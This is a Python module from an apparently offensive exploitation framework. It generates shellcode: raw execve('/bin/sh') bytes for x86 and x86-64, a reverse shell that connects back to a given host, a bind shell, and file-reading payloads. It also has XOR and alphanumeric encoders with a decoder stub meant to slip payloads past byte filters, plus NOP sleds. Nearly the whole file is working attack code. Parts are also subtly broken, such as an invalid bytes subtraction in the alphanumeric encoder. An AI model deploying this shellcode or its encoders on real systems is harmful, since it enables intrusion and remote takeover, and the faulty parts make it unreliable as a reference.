"""
Shellcode generation and encoding.
"""

from dataclasses import dataclass
from typing import Any, Dict, List, Optional

from autopwn.core.context import ExploitContext
from autopwn.utils.logging import get_logger

logger = get_logger(__name__)


@dataclass
class ShellcodeTemplate:
    """Pre-built shellcode template."""
    name: str
    arch: str
    code: bytes
    description: str


class ShellcodeGenerator:
    """
    Shellcode generation and encoding.

    Uses pwntools shellcraft for generation with custom encoding.
    """

    def __init__(self, context: ExploitContext):
        """
        Initialize shellcode generator.

        Args:
            context: Exploitation context
        """
        self.context = context
        self.arch = context.arch
        self.bits = context.bits

    def generate_execve_sh(self) -> bytes:
        """
        Generate execve("/bin/sh", NULL, NULL) shellcode.

        Returns:
            Shellcode bytes
        """
        try:
            from pwn import asm, shellcraft, context

            context.arch = self.arch
            context.bits = self.bits

            shellcode = asm(shellcraft.sh())
            return shellcode

        except ImportError:
            logger.warning("pwntools not available, using pre-built shellcode")
            return self._get_prebuilt_sh()

    def _get_prebuilt_sh(self) -> bytes:
        """Get pre-built /bin/sh shellcode."""
        if self.arch == "amd64":
            # x86_64 execve("/bin/sh", 0, 0)
            return bytes([
                0x48, 0x31, 0xf6,              # xor rsi, rsi
                0x56,                          # push rsi
                0x48, 0xbf, 0x2f, 0x62, 0x69,  # movabs rdi, "/bin//sh"
                0x6e, 0x2f, 0x2f, 0x73, 0x68,
                0x57,                          # push rdi
                0x54,                          # push rsp
                0x5f,                          # pop rdi
                0x48, 0x31, 0xd2,              # xor rdx, rdx
                0xb0, 0x3b,                    # mov al, 59
                0x0f, 0x05,                    # syscall
            ])
        elif self.arch == "i386":
            # x86 execve("/bin/sh", 0, 0)
            return bytes([
                0x31, 0xc0,              # xor eax, eax
                0x50,                    # push eax
                0x68, 0x2f, 0x2f, 0x73, 0x68,  # push "//sh"
                0x68, 0x2f, 0x62, 0x69, 0x6e,  # push "/bin"
                0x89, 0xe3,              # mov ebx, esp
                0x50,                    # push eax
                0x53,                    # push ebx
                0x89, 0xe1,              # mov ecx, esp
                0x31, 0xd2,              # xor edx, edx
                0xb0, 0x0b,              # mov al, 11
                0xcd, 0x80,              # int 0x80
            ])
        else:
            raise ValueError(f"Unsupported architecture: {self.arch}")

    def generate_reverse_shell(
        self,
        host: str,
        port: int,
    ) -> bytes:
        """
        Generate reverse shell shellcode.

        Args:
            host: Callback IP address
            port: Callback port

        Returns:
            Shellcode bytes
        """
        try:
            from pwn import asm, shellcraft, context

            context.arch = self.arch
            context.bits = self.bits

            shellcode = asm(shellcraft.connect(host, port) + shellcraft.dupsh())
            return shellcode

        except ImportError:
            logger.error("pwntools required for reverse shell")
            return b""

    def generate_bind_shell(
        self,
        port: int,
    ) -> bytes:
        """
        Generate bind shell shellcode.

        Args:
            port: Port to bind

        Returns:
            Shellcode bytes
        """
        try:
            from pwn import asm, shellcraft, context

            context.arch = self.arch
            context.bits = self.bits

            shellcode = asm(shellcraft.bindsh(port))
            return shellcode

        except ImportError:
            logger.error("pwntools required for bind shell")
            return b""

    def generate_read_file(
        self,
        filename: str,
        fd: int = 1,
    ) -> bytes:
        """
        Generate shellcode to read and print file.

        Args:
            filename: File to read
            fd: Output file descriptor

        Returns:
            Shellcode bytes
        """
        try:
            from pwn import asm, shellcraft, context

            context.arch = self.arch
            context.bits = self.bits

            shellcode = asm(shellcraft.cat(filename, fd))
            return shellcode

        except ImportError:
            logger.error("pwntools required for file read shellcode")
            return b""

    def generate_custom(
        self,
        assembly: str,
    ) -> bytes:
        """
        Assemble custom shellcode.

        Args:
            assembly: Assembly code string

        Returns:
            Shellcode bytes
        """
        try:
            from pwn import asm, context

            context.arch = self.arch
            context.bits = self.bits

            return asm(assembly)

        except ImportError:
            logger.error("pwntools required for assembly")
            return b""

    def encode_xor(
        self,
        shellcode: bytes,
        key: int = 0x41,
    ) -> bytes:
        """
        XOR encode shellcode.

        Args:
            shellcode: Raw shellcode
            key: XOR key

        Returns:
            Encoded shellcode with decoder stub
        """
        encoded = bytes([b ^ key for b in shellcode])

        if self.arch == "amd64":
            # x86_64 XOR decoder stub
            decoder = bytes([
                0x48, 0x31, 0xc9,                    # xor rcx, rcx
                0x48, 0x83, 0xc1, len(shellcode),    # add rcx, len
                0xeb, 0x0c,                          # jmp get_shellcode
                # decode:
                0x5e,                                # pop rsi
                0x80, 0x36, key,                     # xor byte [rsi], key
                0x48, 0xff, 0xc6,                    # inc rsi
                0xe2, 0xf8,                          # loop decode
                0xeb, 0x05,                          # jmp shellcode
                # get_shellcode:
                0xe8, 0xef, 0xff, 0xff, 0xff,        # call decode
            ])
            return decoder + encoded

        return encoded  # No stub for other archs

    def encode_alphanumeric(
        self,
        shellcode: bytes,
    ) -> bytes:
        """
        Encode shellcode to alphanumeric only.

        Args:
            shellcode: Raw shellcode

        Returns:
            Alphanumeric encoded shellcode
        """
        try:
            from pwn import context
            context.arch = self.arch
            context.bits = self.bits

            # Use pwntools encoder
            from pwnlib.encoders.encoder import encode
            return encode(shellcode, avoid=bytes(range(256)) - bytes(
                b"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
            ))

        except Exception as e:
            logger.error(f"Alphanumeric encoding failed: {e}")
            return shellcode

    def encode_avoid_bytes(
        self,
        shellcode: bytes,
        bad_bytes: List[int],
    ) -> bytes:
        """
        Encode shellcode to avoid specific bytes.

        Args:
            shellcode: Raw shellcode
            bad_bytes: Bytes to avoid

        Returns:
            Encoded shellcode
        """
        try:
            from pwnlib.encoders.encoder import encode

            return encode(shellcode, avoid=bytes(bad_bytes))

        except Exception as e:
            logger.debug(f"Encoding failed: {e}")
            # Fall back to XOR encoding
            for key in range(1, 256):
                if key not in bad_bytes:
                    encoded = bytes([b ^ key for b in shellcode])
                    if not any(b in bad_bytes for b in encoded):
                        # Need to add decoder stub
                        return self.encode_xor(shellcode, key)

        return shellcode

    def get_nop_sled(self, length: int) -> bytes:
        """
        Generate NOP sled.

        Args:
            length: Sled length

        Returns:
            NOP bytes
        """
        if self.arch in ["amd64", "i386"]:
            return b"\x90" * length
        elif self.arch == "arm":
            return b"\x00\xf0\x20\xe3" * (length // 4)  # NOP
        else:
            return b"\x90" * length

    def check_bad_chars(
        self,
        shellcode: bytes,
        bad_chars: List[int],
    ) -> List[int]:
        """
        Check for bad characters in shellcode.

        Args:
            shellcode: Shellcode to check
            bad_chars: Bad byte values

        Returns:
            List of offsets containing bad chars
        """
        bad_offsets = []
        bad_set = set(bad_chars)

        for i, byte in enumerate(shellcode):
            if byte in bad_set:
                bad_offsets.append(i)

        return bad_offsets

    def summary(self) -> str:
        """Get generator summary."""
        return f"""
Shellcode Generator
===================
Arch: {self.arch}
Bits: {self.bits}

Available shellcodes:
- execve /bin/sh
- Reverse shell
- Bind shell
- File read
- Custom assembly

Encoders:
- XOR
- Alphanumeric
- Bad char avoidance
"""
